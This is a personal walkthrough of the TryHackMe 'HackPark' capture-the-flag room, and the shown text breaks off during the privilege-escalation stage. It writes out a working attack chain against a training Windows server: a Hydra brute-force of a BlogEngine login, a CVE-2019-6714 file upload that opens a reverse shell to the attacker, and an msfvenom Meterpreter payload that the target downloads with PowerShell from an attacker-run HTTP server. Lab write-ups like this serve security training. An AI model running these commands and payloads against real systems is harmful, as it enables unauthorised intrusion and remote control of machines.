## Walkthrough
[https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark)

**Difficulty level:** Easy

## Task 1: Deploy the vulnerable Windows machine 

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

### Questions

Q1.Deploy the machine and access its web server.

> "No answer needed"

Q2.Whats the name of the clown displayed on the homepage?

> "Pennywise"

### MyWalk

Just using reverse image on google if you don't recognize the famous clown immediately

## Task 2: Using Hydra to brute-force a login

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.

### Questions

Q1. We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here).

What request type is the Windows website login form using?

> "post"

Q2. Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

```bash
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```
{: .nolineno }

Guess a username, choose a password wordlist and gain credentials to a user account!

> "1qaz2wsx"

### MyWalk

The format is this:  
hydra -l <username> -P <wordlist> <targetIP> http-post-form <login request pattern>

We'll try "admin" as user  
Wordlist will be "/usr/share/wordlists/rockyou.txt"  
The login request pattern parameter its the most difficult part.  
The format parameter is:  
"<path to login form>:<body, with magic strings ^USER^ and ^PASS^>:<pattern that appears in an invalid login>"  
The path to the login form is: "/Account/login.aspx"  
The pattern that appears in case of invalid login is the text that appears when a login fails. Texting a random login it shows "Login failed" on the page.  
For the body, we’ll need to go back to Inspect Element and grab the request payload, or use **burpsuite** and catch the payload when trying some random user:pass

Here is our hydra command:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.148.20 http-post-form "/Account/login.aspx:__VIEWSTATE=0PmFPbjr6L0ykVNVkOxFjCTUBuJwS0RkLnJpLBxGcxaPxYXEtGkcIwrCYoLqaMI8AROYvejb0%2F1iu2b6Zp%2FsiuegsUBVgt4Z%2FC8KQMBwW8fQRLObTDBwY%2F0qxd3z8QPZ%2Ff7EFYBi7iWr9N%2Fgdj7oN5W9AW9dMG39xY%2BokbKnDL87oOKl%2Fok5jk2Hi%2BHOIrL3cRx20gPhijGqneg%2FIamc7eCAqDlFqbmhUJsJ96TV9u7BB34TkuweWvcZDSMUNtzW0ONZWCH0mkQZ2VqQXGoNZEogUADQGoqy72wAokMNLJdQpFjWYkUlWQhJkED7FRJ7KAJCuSHNx7nzQj3Tu18zrJ5nTMxbJPQk%2Fpf9CHiq1ro42yQt&__EVENTVALIDATION=kSawRteG%2BddgXQlXhXu9hPgtdSXb%2FJugk%2FOmNlPkOAFmSJLSTyqgh1RHT82QvprzeuLSrjIC2zeJaUmRE5StSck0hFX4dUyrctJXnXSeh%2BLrru6Jn4YfqahgAruVPvxuH%2BtYEPx5bUHiWMd%2Btf%2Fy7Ux7CmhqmUo%2BAG%2BJ3t0TtqxiV9kD&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Consult the mini cheatsheet at the box link.

## Task 3: Compromise the machine 

In this task, you will identify and execute a public exploit (from exploit-db.com) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

### Questions

Q1. Now you have logged into the website, are you able to identify the version of the BlogEngine?

> "3.3.6.0"

Q2. Use the exploit database archive to find an exploit to gain a reverse shell on this system. 

> "CVE-2019-6714"

Q3. Using the public exploit, gain initial access to the server.

Who is the webserver running as?
 
> "iis apppool\blog"

### MyWalk

For Q1 Just click on "About" tab after login.
Searching for "BlogEngine" at exploit-db.com, gives us the CVE for Q2.
For Q2 we'll just follow the exploit instructions on file 46353.cs:

Copy the file as PostView.ascx, and modify the line with the our attack machine IP:

```bash
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.10", 4445)
```
{: .nolineno }

Then go to the "http://10.10.10.10/admin/app/editor/editpost.cshtml" (Change IP to target) and Click on folder icon. It opens a page to upload our modified file (PostView.ascx). After upload complete, open a new terminal and setup a listener on port 4445:

```bash
nc -nvlp 4445
```
{: .nolineno }

Now type "http://10.10.10.10/?theme=../../App_Data/files" and we can see the reverse shell on listener:

```bash
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.8.242.20] from (UNKNOWN) [10.10.22.190] 49219

whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```
{: .nolineno }

We have the answer for Q3.

## Task 4: Windows Privilege Escalation

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

### Questions

Q1. Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom. If you don't know how to do this, I suggest checking out the Metasploit module!
Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!

> "No answer needed"

Q2. You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the windows-exploit-suggester script and quickly identify any obvious vulnerabilities.
What is the OS version of this windows machine?

> "Windows 2012 R2 6.3 Build 9600"

Q3. Further enumerate the machine.

What is the name of the abnormal service running?
 
> "****************"

Q4. What is the name of the binary you're supposed to exploit? 
 
> "*******.***"

Q5. Using this abnormal service, escalate your privileges!

What is the user flag (on Jeffs Desktop)?
 
> "**************************************"

Q6. What is the root flag?
 
> "**************************************"

### MyWalk

First we start a listener on Metasploit:

```bash
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.8.242.20
LHOST => 10.8.242.20
msf6 exploit(multi/handler) > set LPORT 4446
LPORT => 4446
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.242.20:4446 
```
{: .nolineno }

Now lets generate the payload using msvenom:

```bash
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.242.20 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload

x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```
{: .nolineno }

Now we'll start a local http server:

```bash
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{: .nolineno }

Now on target machine (on previous task opened shell):

```bash
cd c:\windows\temp
c:\windows\system32\inetsrv>cd c:\windows\temp
powershell -c wget "http://10.8.242.20:8000/reverse.exe" -outfile "reverse.exe"
reverse.exec:\Windows\Temp>powershell -c wget "http://10.9.202.151:8000/reverse.exe" -outfile "reverse.exe"

```
{: .nolineno }

Note that first we change to temp folder to have permissions to run the ps command.

Now on the Metasploit listener we must have a meterpreter shell open:

```bash
[*] Started reverse TCP handler on 10.8.242.20:4446 
[*] Sending stage (175686 bytes) to 10.10.22.190
[*] Meterpreter session 1 opened (10.8.242.20:4446 -> 10.10.22.190:49375) at 2024-02-25 06:11:41 -0500

meterpreter > 
```
{: .nolineno }


To know the OS version of the windows machine we will run sysinfo:

```bash
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```
{: .nolineno }

We have Q2

Now for enumerating the machine, let's use winPEAS (https://github.com/carlospolop/PEASS-ng/releases/download/20240225-3f95dc31/winPEASx64.exe)

```bash
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20240225-3f95dc31/winPEASx64.exe

```
{: .nolineno }

Now lets run winPEAS on target. For that we must upload it using meterpreter, run shell to exit meterpreter and then run winPEAS with servicesinfo parameter:

```bash
meterpreter > upload winPEASx64.exe
[*] Uploading  : /home/ppmatrix/Desktop/thm/rooms/hackpark/winPEASx64.exe -> winPEASx64.exe
